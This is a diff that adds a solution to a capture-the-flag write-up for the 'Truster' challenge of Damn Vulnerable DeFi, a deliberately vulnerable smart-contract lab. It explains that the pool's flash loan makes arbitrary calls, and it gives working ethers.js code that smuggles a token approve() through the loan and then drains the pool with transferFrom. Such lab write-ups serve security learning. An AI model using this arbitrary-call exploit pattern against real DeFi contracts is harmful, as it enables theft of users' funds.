@@ -8,3 +8,14 @@ To pass this challenge, take all tokens out of the pool. If possible, in a singl
 - [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v3.0.0/test/truster/truster.challenge.js)
 ___
 ## Solution:
+
+We can see, that it is impossible to steal tokens from pool via `flashLoan`, but we can run any function from any contract we want. So let's approve player call token's function `transferFrom` 
+And after it we will be able to steal tokens. 
+
+```js
+let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
+let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+
+await pool.connect(player).flashLoan(0, player.address, token.address, data);
+await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+```
